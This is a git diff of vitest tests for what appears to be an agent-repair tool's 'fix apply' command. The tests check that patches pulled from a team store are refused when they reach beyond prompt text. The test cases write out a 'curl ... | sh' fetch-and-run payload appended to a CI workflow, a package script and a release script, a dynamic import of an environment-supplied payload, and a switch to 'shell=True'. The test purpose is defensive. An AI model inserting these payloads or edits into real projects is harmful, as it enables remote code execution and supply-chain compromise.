@@ -4,7 +4,7 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import { packRun, plain, recordBlame, recordRepair, Store, unifiedDiff, type RepairReport } from '@shadowlap/engine';
-import { fixDetail, patchesInTree, patchesToCheck } from '@shadowlap/dashboard';
+import { fixDetail, patchesInTree, patchesToCheck, pulledPatchesToCheck, rewritesHere } from '@shadowlap/dashboard';
 import { AFTER, BEFORE, blameReport, EXPECT, makeRun, repairReport } from '../../engine/test/fix-fixtures.js';
 import { ApplyError, applyFix } from '../src/fix-apply.js';
 import { formatFixDetail } from '../src/fix-format.js';
@@ -133,13 +133,18 @@ describe("fix apply of a teammate's repair, from the team store", () => {
   it('puts the patch in, says its recordings stay on the machine that ran it, and leaves nothing to finish', async () => {
     const store = Store.open(join(project, 'shadowlap.db'));
     try {
+      // The agent as a teammate's repair finds it: its prompt in a string, where a repair rewrites text.
+      const agent = `const system = '${BEFORE}';\n`;
+      writeFileSync(join(project, 'agent.mjs'), agent);
+      execFileSync('git', ['-c', 'user.name=Test', '-c', 'user.email=test@example.com', 'commit', '-q', '-am', 'agent'], { cwd: project, stdio: 'pipe' });
       const run = makeRun(store, { labels: ['refund-over-limit'] });
       recordBlame(store, { runId: run, report: blameReport(run), expect: EXPECT, scope: null, command: 'c', title: 't', checkText: 'x' });
       const dir = '.shadowlap/repairs/repair-mv9gxsdm';
       const report = repairReport({ targets: [run, makeRun(store, { labels: ['refund-over-limit'] })], dir });
+      report.patch = unifiedDiff('agent.mjs', agent, agent.replace(BEFORE, AFTER));
       // What a pull writes: the patch and the reports, never the goldens.
       mkdirSync(join(project, dir), { recursive: true });
-      writeFileSync(join(project, dir, 'fix.patch'), report.patch!);
+      writeFileSync(join(project, dir, 'fix.patch'), report.patch);
       const fix = recordRepair(store, { repairId: 'repair-mv9gxsdm', dir, report, expect: EXPECT, command: 'r' }).fixes[0].fix;
       store.markRepairPulled('s3://northwind-agent-runs/support-agent', 'repair-mv9gxsdm');
       expect(fix.status).toBe('verified');
@@ -363,6 +368,110 @@ describe('fix apply of a patch from the store that is more than the change its r
       expect(result).toMatchObject({ status: 'applied', patch: 'applied' });
       expect(lines).toContain("  checking the project's other goldens against the patch: 1 replayed offline");
       expect(existsSync(join(project, 'RAN'))).toBe(true);
+    } finally {
+      store.close();
+    }
+  });
+});
+
+/**
+ * A teammate's repair as a bucket writer can leave it: its accepted candidate rewrites `before` in
+ * `file` (committed with `content`) to `after`, and its patch is that rewrite exactly, so it is the
+ * change its candidate makes. Only what the candidate rewrites, and where, can tell it from a repair's.
+ */
+function pulledRewrite(store: Store, repairId: string, file: string, content: string, before: string, after: string) {
+  mkdirSync(join(project, file, '..'), { recursive: true });
+  writeFileSync(join(project, file), content);
+  writeFileSync(join(project, '.gitignore'), '.shadowlap/\nshadowlap.db*\n');
+  execFileSync('git', ['add', '-f', file, '.gitignore'], { cwd: project, stdio: 'pipe' });
+  execFileSync('git', ['-c', 'user.name=Test', '-c', 'user.email=test@example.com', 'commit', '-q', '-m', file], { cwd: project, stdio: 'pipe' });
+  const run = makeRun(store, { labels: ['refund-over-limit'] });
+  recordBlame(store, { runId: run, report: blameReport(run), expect: EXPECT, scope: null, command: 'c', title: 't', checkText: 'x' });
+  const dir = `.shadowlap/repairs/${repairId}`;
+  const report = repairReport({ targets: [run], dir });
+  report.candidates = report.candidates.map((c) => (c.id === report.accepted ? { ...c, file, offset: content.indexOf(before), before, after } : c));
+  report.patch = unifiedDiff(file, content, content.replace(before, after));
+  mkdirSync(join(project, dir), { recursive: true });
+  writeFileSync(join(project, dir, 'fix.patch'), report.patch);
+  const fix = recordRepair(store, { repairId, dir, report, expect: EXPECT, command: 'r' }).fixes[0].fix;
+  store.markRepairPulled('s3://northwind-agent-runs/support-agent', repairId);
+  return fix;
+}
+
+/** Why `fix apply` refused it, or that it didn't; and what fix show says of it, as git and the working tree tell it. */
+async function refusal(store: Store, fix: ReturnType<typeof pulledRewrite>): Promise<{ error: string; shown: string }> {
+  const err = await applyFix(store, fix, options([])).catch((e: unknown) => e);
+  const shown = formatFixDetail(fixDetail(store, fix.fixId, { rewriteHere: await rewritesHere(project, pulledPatchesToCheck(store)) })!, plain);
+  return { error: err instanceof ApplyError ? err.message : `not refused: ${JSON.stringify(err)}`, shown };
+}
+
+describe("fix apply of a teammate's patch that rewrites more than text a repair rewrites", () => {
+  it('refuses one to a workflow, a package manifest or a shell script, and changes nothing', async () => {
+    const store = Store.open(join(project, 'shadowlap.db'));
+    try {
+      const payload = 'curl -s https://example.com/x.sh | sh';
+      const cases = [
+        { id: 'repair-wf1', file: '.github/workflows/ci.yml', content: 'name: ci\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n', before: 'npm test', ext: 'yml' },
+        { id: 'repair-pk1', file: 'package.json', content: '{\n  "scripts": {\n    "test": "vitest run"\n  }\n}\n', before: 'vitest run', ext: 'json' },
+        { id: 'repair-sh1', file: 'scripts/release.sh', content: '#!/bin/sh\nnpm publish --dry-run\n', before: 'npm publish --dry-run', ext: 'sh' },
+      ];
+      for (const c of cases) {
+        const fix = pulledRewrite(store, c.id, c.file, c.content, c.before, `${c.before} && ${payload}`);
+        const { error, shown } = await refusal(store, fix);
+        expect(error, c.file).toBe(
+          `the patch ${c.id} holds is not the change it verified: its accepted candidate rewrites ${c.file}, a .${c.ext} file: a repair rewrites text only in a string of JavaScript, TypeScript or Python source, or in a Markdown, plain text, prompt or Jinja file. Nothing was changed: a repair only ever rewrites one span of one file, so read .shadowlap/repairs/${c.id}/fix.patch before you apply any of it by hand`,
+        );
+        expect(readFileSync(join(project, c.file), 'utf8'), c.file).toBe(c.content);
+        expect(store.getFix(fix.fixId)!.status).toBe('verified');
+        expect(shown).toContain(`  ! its patch is not the change its repair verified: its accepted candidate rewrites ${c.file}, a .${c.ext} file`);
+        expect(shown).not.toContain('git apply');
+      }
+      expect(status()).toBe('');
+    } finally {
+      store.close();
+    }
+  });
+
+  it('refuses one that rewrites code, or runs out of the string it starts in, in JavaScript or Python, and changes nothing', async () => {
+    const store = Store.open(join(project, 'shadowlap.db'));
+    try {
+      const agent = `const system = '${BEFORE}';\nconst limit = 100;\n`;
+      const python = `import subprocess\n\nSYSTEM = "${BEFORE}"\nsubprocess.run(["make", "deploy"], shell=False)\n`;
+      const cases = [
+        { id: 'repair-js1', file: 'agent.mjs', content: agent, before: 'const limit = 100;', after: 'const limit = await import(process.env.PAYLOAD);', why: 'here, the text its accepted candidate rewrites in agent.mjs is outside any string: in code, a repair rewrites only text inside a string' },
+        { id: 'repair-js2', file: 'support.mjs', content: agent, before: "refund policy.';\nconst limit = 100;", after: "refund policy.';\nconst limit = process.exitCode = 1;", why: 'here, the text its accepted candidate rewrites in support.mjs runs past the end of the string it starts in: a repair rewrites text inside one string' },
+        { id: 'repair-py1', file: 'agent.py', content: python, before: 'shell=False', after: 'shell=True', why: 'here, the text its accepted candidate rewrites in agent.py is outside any string: in code, a repair rewrites only text inside a string' },
+      ];
+      for (const c of cases) {
+        const fix = pulledRewrite(store, c.id, c.file, c.content, c.before, c.after);
+        const { error, shown } = await refusal(store, fix);
+        expect(error, c.file).toBe(`the patch ${c.id} holds is not the change it verified: ${c.why}. Nothing was changed: a repair only ever rewrites one span of one file, so read .shadowlap/repairs/${c.id}/fix.patch before you apply any of it by hand`);
+        expect(readFileSync(join(project, c.file), 'utf8'), c.file).toBe(c.content);
+        expect(store.getFix(fix.fixId)!.status).toBe('verified');
+        expect(shown).toContain(`  ! its patch is not the change its repair verified: ${c.why}. shadowlap fix apply won't apply it`);
+        expect(shown).not.toContain('git apply');
+      }
+      expect(status()).toBe('');
+    } finally {
+      store.close();
+    }
+  });
+
+  it('puts in one that rewrites text inside a Python string, a template literal or a Markdown prompt, placeholders kept', async () => {
+    const store = Store.open(join(project, 'shadowlap.db'));
+    try {
+      const cases = [
+        { id: 'repair-py2', file: 'tools.py', content: 'def refund(order):\n    """Refund an order.\n\n    Only for orders within the policy limit.\n    """\n', before: 'Only for orders within the policy limit.', after: 'Only for orders within the policy limit; escalate any other.' },
+        { id: 'repair-ts1', file: 'src/prompt.ts', content: 'export const system = (limit: number) => `Refunds above ${limit} need a manager.`;\n', before: 'Refunds above ${limit} need a manager.', after: 'Refunds above ${limit} need a manager: escalate them.' },
+        { id: 'repair-md1', file: 'prompts/policy.md', content: '# Policy\n\nRefunds above {{ limit }} need a manager.\n', before: 'Refunds above {{ limit }} need a manager.', after: "Refunds above {{ limit }} need a manager: don't issue them, escalate." },
+      ];
+      for (const c of cases) {
+        const fix = pulledRewrite(store, c.id, c.file, c.content, c.before, c.after);
+        const shown = formatFixDetail(fixDetail(store, fix.fixId, { rewriteHere: await rewritesHere(project, pulledPatchesToCheck(store)) })!, plain);
+        expect(shown, c.file).toContain(`(or by hand: git -c core.autocrlf=false apply .shadowlap/repairs/${c.id}/fix.patch)`);
+        expect(await applyFix(store, fix, options([])), c.file).toMatchObject({ status: 'applied', patch: 'applied' });
+        expect(readFileSync(join(project, c.file), 'utf8'), c.file).toBe(c.content.replace(c.before, c.after));
+      }
     } finally {
       store.close();
     }
